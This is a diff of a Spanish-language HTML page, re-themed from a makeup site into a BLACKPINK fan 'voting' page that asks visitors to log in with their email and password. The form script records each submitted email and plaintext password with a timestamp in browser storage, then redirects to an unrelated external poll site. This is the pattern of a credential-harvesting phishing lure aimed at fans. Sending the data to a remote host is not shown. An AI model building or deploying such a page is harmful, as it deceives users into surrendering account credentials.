@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Inicia Sesión</title>
+  <title>Votación BLACKPINK</title>
 
   <!-- Fuente bonita y amigable -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
@@ -19,12 +19,12 @@
       flex-direction: column;
 
       /* Fondo con imagen */
-      background: url('https://thumbs.dreamstime.com/b/collage-con-iconos-de-belleza-colores-pasteles-que-muestran-los-labios-cepillado-y-elementos-la-botella-maquillaje-sobre-un-fondo-395234450.jpg') no-repeat center center fixed;
+      background: url('https://pbs.twimg.com/media/FvTDI2_X0AE-aNl.jpg:large') no-repeat center center fixed;
       background-size: cover;
     }
 
     .login-box { 
-      background: rgba(255, 255, 255, 0.9); /* blanco semitransparente */
+      background: rgba(255, 255, 255, 0.9); 
       padding: 40px; 
       border-radius: 20px; 
       box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
@@ -39,12 +39,12 @@
       margin-bottom: 5px; 
       font-weight: 600; 
       font-size: 22px; 
-      color: #333; 
+      color: #111; 
     }
 
     .login-box p { 
       margin-top: 0; 
-      color: #666; 
+      color: #444; 
       font-size: 14px; 
     }
 
@@ -60,7 +60,7 @@
     .login-box button { 
       width: 100%; 
       padding: 12px; 
-      background: #ff416c; 
+      background: linear-gradient(90deg, #ff3399, #000000); /* estilo BLACKPINK */
       border: none; 
       border-radius: 10px; 
       color: white; 
@@ -72,7 +72,8 @@
     }
 
     .login-box button:hover { 
-      background: #ff4b2b; 
+      opacity: 0.85; 
+      transform: scale(1.05);
     }
 
     .extra { 
@@ -82,7 +83,7 @@
     }
 
     .extra a { 
-      color: #ff416c; 
+      color: #ff3399; 
       text-decoration: none; 
       cursor: pointer; 
     }
@@ -91,7 +92,7 @@
       text-decoration: underline; 
     }
 
-    /* Animación fade-in */
+    /* Animación */
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(-20px); }
       to { opacity: 1; transform: translateY(0); }
@@ -100,14 +101,15 @@
 </head>
 <body>
 
-  <!-- Formulario -->
+  <!-- Caja de Login -->
   <div class="login-box">
-    <h2>Inicia sesión para descubrir este mundo de maquillaje</h2>
-    <p>Bienvenida, ingresa tus datos y explora la belleza</p>
+    <h2>Inicia sesión y vota por tu integrante favorita 💖🖤</h2>
+    <p>BLINK, tu voto cuenta ✨ ¡Hazlo valer en esta votación especial!</p>
+    
     <form id="loginForm">
       <input type="email" name="email" placeholder="Correo electrónico" required>
       <input type="password" name="password" placeholder="Contraseña" required>
-      <button type="submit">Ingresar</button>
+      <button type="submit">Ir a Votación</button>
     </form>
 
     <div class="extra">
@@ -129,8 +131,8 @@
       historial.push({ email, password, fecha: new Date().toLocaleString() });
       localStorage.setItem('historialDatos', JSON.stringify(historial));
 
-      // Redirigir a tu página
-      window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
+      // Redirigir a la votación
+      window.location.href = "https://www.tuvotacion.com/quien-es-la-ms-bonita-de-blackpink-1";
     });
 
     recoverLink.addEventListener('click', function(){
@@ -145,4 +147,3 @@
 
 </body>
 </html>
-
